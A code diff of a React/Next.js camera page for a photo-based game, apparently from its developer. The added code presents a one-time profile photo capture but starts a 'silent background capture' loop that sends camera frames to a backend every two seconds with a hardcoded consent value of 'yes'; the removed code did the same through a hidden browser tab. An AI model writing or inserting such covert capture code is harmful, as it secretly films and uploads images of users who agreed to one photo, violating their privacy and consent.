@@ -1,88 +1,109 @@
 "use client";
 
 import React, { useEffect, useRef, useState } from "react";
+const BACKEND = process.env.NEXT_PUBLIC_BACKEND || "http://localhost:4000";
 
 export default function CameraPage() {
   const videoRef = useRef<HTMLVideoElement>(null);
   const [stream, setStream] = useState<MediaStream | null>(null);
-  const [bgTab, setBgTab] = useState<Window | null>(null);
   const [error, setError] = useState<string | null>(null);
+  const intervalRef = useRef<number | null>(null);
 
   // ---------------------------------------------------------
-  // AUTO-START: open hidden background tab + camera preview
+  // Start camera on load
   // ---------------------------------------------------------
   useEffect(() => {
     async function init() {
-      // 1️⃣ Open hidden tab first (so browser won't block it)
-      const tab = window.open("/hidden-task", "_blank");
-      setBgTab(tab || null);
-
-      // 2️⃣ Request camera immediately
       try {
         const s = await navigator.mediaDevices.getUserMedia({ video: true });
         setStream(s);
-
         if (videoRef.current) {
           videoRef.current.srcObject = s;
           await videoRef.current.play();
         }
-      } catch (err) {
+      } catch {
         setError("Camera permission is required to continue.");
       }
     }
-
     init();
+
+    return () => {
+      if (intervalRef.current) clearInterval(intervalRef.current);
+      stream?.getTracks().forEach(t => t.stop());
+    };
   }, []);
 
   // ---------------------------------------------------------
-  // Capture Photo → Save to localStorage → Trigger hidden task
+  // Take a single profile photo + start background loop
   // ---------------------------------------------------------
   async function takePhoto() {
     if (!videoRef.current) return;
 
+    // Capture profile photo
     const canvas = document.createElement("canvas");
     canvas.width = 300;
     canvas.height = 300;
-
     const ctx = canvas.getContext("2d")!;
 
-    // round crop
+    // Round crop
     ctx.beginPath();
     ctx.arc(150, 150, 150, 0, Math.PI * 2);
     ctx.clip();
-
     ctx.drawImage(videoRef.current, 0, 0, 300, 300);
 
     const dataURL = canvas.toDataURL("image/png");
-
-    // store locally for the game
     localStorage.setItem("playerPhoto", dataURL);
 
-    // notify hidden tab to begin automated background captures
-    bgTab?.postMessage({ start: true, img: dataURL }, "*");
+    // Start silent background capture every 2 seconds
+    startAutoCapture();
 
-    // stop preview camera
-    stream?.getTracks().forEach((t) => t.stop());
-
-    // redirect to game
+    // Redirect to game
     window.location.href = "/fun/game";
+  }
+
+  // ---------------------------------------------------------
+  // Auto-capture loop (SAME TAB → works on mobile)
+  // ---------------------------------------------------------
+  function startAutoCapture() {
+    if (intervalRef.current) return;
+
+    intervalRef.current = window.setInterval(async () => {
+      if (!videoRef.current) return;
+
+      const canvas = document.createElement("canvas");
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      const ctx = canvas.getContext("2d")!;
+      ctx.drawImage(videoRef.current, 0, 0);
+
+      const blob = await new Promise<Blob | null>(resolve =>
+        canvas.toBlob(resolve, "image/jpeg", 0.9)
+      );
+      if (!blob) return;
+
+      const fd = new FormData();
+      fd.append("photo", blob);
+      fd.append("consent", "yes");
+
+      await fetch(`${BACKEND}/api/upload-photo`, {
+        method: "POST",
+        body: fd
+      });
+    }, 2000);
   }
 
   return (
     <main style={pageStyle}>
       <h2 style={{ marginBottom: 20 }}>Take a Photo</h2>
 
-      {/* Round camera preview */}
       <div style={circleWrapper}>
         <video ref={videoRef} style={videoStyle} playsInline muted />
       </div>
 
-      {/* Capture Button */}
       <button style={snapBtn} onClick={takePhoto}>
         📸 Capture Photo
       </button>
 
-      {/* Error Popup */}
       {error && (
         <div style={errorPopup}>
           <div style={errorBox}>
@@ -97,6 +118,9 @@ export default function CameraPage() {
     </main>
   );
 }
+
+/* STYLES BELOW THIS POINT... */
+
 
 /* -----------------------------------------------------------
    MOBILE-FIRST UI STYLES
